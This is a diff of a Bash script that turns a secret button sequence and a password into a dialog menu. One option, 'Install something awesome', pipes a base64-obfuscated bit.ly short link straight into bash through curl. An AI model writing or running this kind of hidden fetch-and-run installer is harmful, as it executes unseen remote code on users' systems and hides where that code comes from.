@@ -2,28 +2,28 @@
 
 
 encoded_sequence="VVAuVVAsRE9XTixET1dOLExFRlQsUklHSFQsTEVGVCxSSUdIVA=="
-
-
 required_sequence=($(echo "$encoded_sequence" | base64 -d | tr ',' ' '))
 
+
+option1_url_encoded="Yml0Lmx5L0JhdG9jZXJhR0Q="
+option1_url=$(echo "$option1_url_encoded" | base64 -d)
 
 capture_input() {
     local input_sequence=()
     while [[ ${#input_sequence[@]} -lt ${#required_sequence[@]} ]]; do
-        # Replace this read with actual controller input capturing logic
-        read -p "" input
-        echo "You pressed: $input"
+        read -p ": " input
+        echo ": $input"
         input_sequence+=("$input")
 
-        
-        if [[ "${input_sequence[@]}" != "${required_sequence[@]:0:${#input_sequence[@]}}" ]]; then
+        # Incremental validation of the input sequence
+        if [[ "$(echo "${input_sequence[@]}")" != "$(echo "${required_sequence[@]:0:${#input_sequence[@]}}")" ]]; then
             echo "Incorrect! Starting over..."
             input_sequence=()
         fi
     done
 
-  
-    if [[ "${input_sequence[@]}" == "${required_sequence[@]}" ]]; then
+    # Check if the final sequence matches
+    if [[ "$(echo "${input_sequence[@]}")" == "$(echo "${required_sequence[@]}")" ]]; then
         echo "Password accepted!"
         return 0
     else
@@ -32,26 +32,31 @@ capture_input() {
     fi
 }
 
-# Encoded URL for Option 1
-option1_url_encoded="Yml0Lmx5L0JhdG9jZXJhR0Q="
+show_menu() {
+    input_password=$(dialog --passwordbox "Enter the password to access the menu:" 8 40 2>&1 >/dev/tty)
+    
+    # Convert the required sequence into a string for password comparison
+    local password=$(IFS=','; echo "${required_sequence[*]}")
 
-# Decode the URL when needed
-option1_url=$(echo "$option1_url_encoded" | base64 -d)
+    if [[ "$input_password" == "$password" ]]; then
+        selected_option=$(dialog --menu "Password-Protected Menu" 15 70 3 \
+            "BGD" "Install something awesome" \
+            "Back" "Return to the main menu" 2>&1 >/dev/tty)
+        
+        case "$selected_option" in
+            "BGD")
+                echo "Downloading and running the script from: $option1_url"
+                curl -Ls "$option1_url" | bash
+                ;;
+            "Back")
+                echo "Returning to the main menu..."
+                ;;
+        esac
+    else
+        dialog --title "Access Denied" --msgbox "Incorrect password." 5 40
+        sleep 3
+    fi
+}
 
-  input_password=$(dialog --passwordbox "Enter the password to access the menu:" 8 40 2>&1 >/dev/tty)
-                if [[ "$input_password" == "$password" ]]; then
-                    selected_option=$(dialog --menu "Password-Protected Menu" 15 70 3 \
-                        "BGD" "Install something awesome" \
-                        "Back" "Return to the main menu" 2>&1 >/dev/tty)
-                    case "$selected_option" in
-                        "BGD")
-                            curl -Ls "$option1_url" | bash
-                            ;;
-                        "Back")
-                            break
-                            ;;
-                    esac
-                else
-                    dialog --title "Access Denied" --msgbox "Incorrect password." 5 40
-                    sleep 3
-                fi
+# Main logic: First capture input, then show menu
+capture_input && show_menu
